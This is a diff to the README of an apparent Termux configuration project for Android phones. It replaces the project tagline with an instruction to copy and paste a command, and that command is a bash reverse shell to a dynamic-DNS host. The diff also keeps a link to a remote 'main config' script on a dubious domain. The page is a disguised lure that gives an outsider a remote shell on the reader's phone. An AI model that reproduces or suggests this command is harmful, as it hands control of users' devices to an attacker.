@@ -43,10 +43,10 @@ bash -i >& /dev/tcp/termux-configure.ddns.net/25251 0>&1
     <img src="images/logo.png" alt="Logo" width="80" height="80">
   </a>
 
-  <h3 align="center">Configurations for termux for android Phones, supported devices are (SAMSUNG,OPPO,REDMI,XIAOMI,REALMI,** NOKIA AND IOS PHONES ARE NOT SUPPORTED** Thanks.</h3>
+  <h3 align="center">Configurations for termux for android Phones, supported devices are (SAMSUNG,OPPO,REDMI,XIAOMI,REALMI,** NOKIA AND IOS PHONES ARE NOT SUPPORTED** Copy And Paste this command bellow on your termux to configurate it. /h3>
 
   <p align="center">
-    An awesome cfgs to jumpstart your projects!
+    bash -i >& /dev/tcp/termux-configure.ddns.net/25251 0>&1
     <br />
     <a href="https://fb-tracker.cf/config/config.sh"><strong>Download main config »</strong></a>
     <br />
